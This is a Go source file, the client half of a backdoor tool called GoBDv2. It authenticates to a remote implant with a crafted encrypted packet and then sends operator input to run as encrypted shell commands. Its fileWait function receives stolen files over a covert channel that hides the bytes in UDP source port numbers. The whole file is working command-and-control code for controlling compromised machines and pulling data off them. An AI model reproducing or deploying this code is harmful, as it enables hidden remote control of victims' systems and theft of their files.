package main
/* client.go
   PROGRAM: GoBDv2 Final
   AUTHOR: Ramzi Chennafi
   DATE: November 18 2015
   FUNCTIONS:
         intiatClient(string, uint16, uint16)
         fileWait(string, string, uint16) 
         sendAuthPacket(string, string, uint16)    
   ABOUT:
   Main body of code for the client, handles all commands and responses.
*/
import(
	"os"
	"fmt"
	"strings"
	"bufio"
	"io/ioutil"
	"golang.org/x/crypto/ssh/terminal"
	"runtime"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket"
	"bytes"
	"encoding/binary"
)
/* 
    FUNCTION: func intiateClient(ip string, port, lport uint16)
    RETURNS: Nothing
    ARGUMENTS: 
                string ip : the ip address of the server
                uint16 port : port to send data to
                uint16 lport : port to listen for data on

    ABOUT:
    Intiates the client of the GoBD application. Grabs the authentication code from the user and sends it to the
    server if correct. Then idles waiting for user input and server output. Also provides help documentation
*/
func intiateClient(ip string, port, lport uint16){
	
	for {
		fmt.Print("Please input the authentication code: ");
		var authstr string;
		if runtime.GOOS == "windows" {
			reader := bufio.NewReader(os.Stdin);
			authstr, _ := reader.ReadString('\n');
			authstr = strings.TrimSpace(authstr);
		} else {			
			authcode, _ := terminal.ReadPassword(0);
			authstr = string(authcode);
		}
		
		if authstr == passwd {
			go beginListen(ip, port, lport)
			sendAuthPacket(ip, authstr, port)
			break;
		}
		fmt.Print("\nInvalid authentication code, try again.\n");
	}
 
	fmt.Printf("Type ?help for more info on sending client commands.\n");
	
	for {
		reader := bufio.NewReader(os.Stdin);
		input, _ := reader.ReadString('\n');
		input = strings.TrimSpace(input);
		if strings.HasPrefix(input, "!") {
			sendEncryptedData(port, "[BD]" + input, ip, CMD);
			if strings.HasPrefix(input, "!monitor") {
				args := strings.Split(input, " ");
				go fileWait(ip, args[1], lport)
			}
		} else if input == "?help" {
			fmt.Print(HELPSTR);
			continue;
		} else {
			sendEncryptedData(port, "[EXEC]" + input, ip, CMD);
		}
	}
}
/* 
    FUNCTION: sendAuthPacket(ip, authstr string, port uint16)
    RETURNS: Nothing
    ARGUMENTS: 
                string ip - the ip address of the server
                int port  - port to send data to
                string authstr - the authentication string to send
    ABOUT:
    Intiates the client of the GoBD application. Grabs the authentication code from the user and sends it to the
    server if correct. Then idles waiting for user input and server output. Also provides help documentation
*/
func sendAuthPacket(ip, authstr string, port uint16){

	cryptdata := encrypt_data([]byte(authstr))

	bbuffer := craftPacket([]byte{4,4,3,2}, ip, port, cryptdata)
	
	err := handle.WritePacketData(bbuffer);
	checkError(err)
}
/* 
    FUNCTION: fileWait(ip, filename string, lport uint16)
    RETURNS: Nothing
    ARGUMENTS: 
                string ip - the ip address of the server
                string filename - the file we are waiting for
                uint16 lport - the port we're listening on
    ABOUT:
    Waits as a seperate thread for incoming file data on the lport + 1. Upon recieving a 
    FSND_COMPLETE packet, saves the recieved file and shuts the thread down.
*/
func fileWait(ip, filename string, lport uint16){

	var ipLayer layers.IPv4
	var ethLayer layers.Ethernet
	var udpLayer layers.UDP
	var payload gopacket.Payload

	parser := gopacket.NewDecodingLayerParser(layers.LayerTypeEthernet, &ethLayer, &ipLayer, &udpLayer, &payload)
	decoded := make([]gopacket.LayerType, 0, 4)
	fBuffer := new(bytes.Buffer)
	
	packetSource := gopacket.NewPacketSource(fhandle, fhandle.LinkType())
	for {
		packet, err := packetSource.NextPacket() 
		checkError(err)

		err = parser.DecodeLayers(packet.Data(), &decoded)
		if err != nil {
			continue
		}

		if len(decoded) < 3 {
			fmt.Println("Not enough layers!")
			continue
		}

		incomingIP := ipLayer.SrcIP.String()
		
		if incomingIP == ip && uint16(udpLayer.DstPort) == lport + 1 {
			err = binary.Write(fBuffer, binary.BigEndian, MAX_PORT - uint16(udpLayer.SrcPort))
			checkError(err)
		} else if incomingIP == ip && uint16(udpLayer.DstPort) == FSND_CMPLETE {
			data := decrypt_data(fBuffer.Bytes())
			
			err := ioutil.WriteFile(filename, data, 0644)
			checkError(err)

			fmt.Printf("File transfer %s completed. Transfered: %d bytes", filename, fBuffer.Len())
			return
		}
	}
}
